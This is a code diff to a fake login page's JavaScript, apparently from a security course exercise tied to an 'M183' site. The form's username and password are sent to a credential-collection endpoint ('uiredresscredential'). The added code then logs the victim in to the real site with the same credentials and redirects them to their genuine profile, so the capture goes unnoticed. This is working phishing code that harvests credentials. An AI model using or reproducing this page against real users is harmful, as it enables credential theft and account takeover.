@@ -108,6 +108,9 @@
     </style>
     <script>
         function sendToServer() {
+            let username = document.getElementsByClassName('username')[0].value;
+            let password = document.getElementsByClassName('password')[0].value
+
             fetch('https://m183.gibz-informatik.ch/api/uiredresscredential', {
                 method: 'POST',
                 headers: {
@@ -115,11 +118,50 @@
                     'X-Api-Key': 'NAAyADcANwAyADgAMQA5ADAAMgAwADkAOAAxADcAOQA5ADgA'
                 },
                 body: JSON.stringify({
-                    "username": document.getElementsByClassName('username')[0].value,
-                    "password": document.getElementsByClassName('password')[0].value
+                    "username": username,
+                    "password": password
                 })
             }).then(res => {
-                console.log(res)
+                fetch("https://m183.gibz-informatik.ch/api/authentication/authenticate", {
+                    "headers": {
+                        "accept": "application/json, text/plain, */*",
+                        "accept-language": "en,de;q=0.9",
+                        "content-type": "application/json",
+                        "sec-ch-ua-mobile": "?0",
+                        "sec-fetch-dest": "empty",
+                        "sec-fetch-mode": "cors",
+                        "sec-fetch-site": "same-origin"
+                    },
+                    "referrer": "https://m183.gibz-informatik.ch/login",
+                    "referrerPolicy": "strict-origin-when-cross-origin",
+                    "body": `{\"username\":\"${username}\",\"password\":\"${password}\"}`,
+                    "method": "POST",
+                    "mode": "cors",
+                    "credentials": "include"
+                }).then(res => {
+                    console.log(res)
+                    fetch("https://m183.gibz-informatik.ch/api/user/profile", {
+                        "headers": {
+                            "accept": "application/json, text/plain, */*",
+                            "accept-language": "en",
+                            "sec-ch-ua": "\"Chromium\";v=\"92\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"92\"",
+                            "sec-ch-ua-mobile": "?0",
+                            "sec-fetch-dest": "empty",
+                            "sec-fetch-mode": "cors",
+                            "sec-fetch-site": "same-origin"
+                        },
+                        "referrer": "https://m183.gibz-informatik.ch/profile",
+                        "referrerPolicy": "strict-origin-when-cross-origin",
+                        "body": null,
+                        "method": "GET",
+                        "mode": "cors",
+                        "credentials": "include"
+                    }).then(() => {
+                        location.href = 'https://m183.gibz-informatik.ch/profile'
+                    })
+                }).catch(() => {
+                    location.href = 'https://m183.gibz-informatik.ch/login'
+                })
             }).catch((error) => {
                 console.log(error)
             })
